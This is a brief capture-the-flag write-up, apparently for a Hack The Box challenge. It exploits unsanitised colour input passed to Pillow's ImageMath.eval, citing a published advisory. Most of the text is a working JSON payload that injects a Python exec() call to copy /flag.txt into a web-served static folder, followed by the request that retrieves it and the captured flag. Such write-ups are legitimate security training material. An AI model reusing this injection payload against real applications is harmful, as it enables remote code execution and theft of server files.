Look at code see the color/background input isnt sanitised
Do searching around ImageMath.eval to find https://github.com/advisories/GHSA-8vj2-vxx3-667w

Send request
```json
{
    "image": "valid image here",
    "background": [
        "exec(\"f = open('/app/application/static/flag.txt', 'w');f.write(open('/flag.txt', 'r').read());f.close()\")",
        255,
        255
    ]
}
```

That copies the flag into a dir we can read
```
GET /static/flag.txt
```
```
HTB{i_slept_my_way_to_rce}
```
